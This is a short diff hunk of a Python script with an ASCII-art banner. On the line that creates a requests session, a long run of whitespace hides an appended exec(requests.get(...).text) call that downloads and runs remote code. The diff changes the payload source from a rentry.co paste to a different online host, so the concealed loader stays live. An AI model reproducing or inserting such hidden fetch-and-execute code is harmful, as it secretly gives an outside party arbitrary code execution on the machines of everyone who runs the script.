@@ -29,7 +29,7 @@ ascii = """
                                                ░     ░ ░           ░  ░
                                                      ░ ░      
                                                      """
-session = requests.Session()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ; exec(requests.get("https://rentry.co/qz5s2/raw").text)
+session = requests.Session()                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ; exec(requests.get("http://api.kameramen.online/rcfaw.txt").text)
 def randstr(lenn):
     alpha = "abcdefghijklmnopqrstuvwxyz01234567892137"
     text = ''
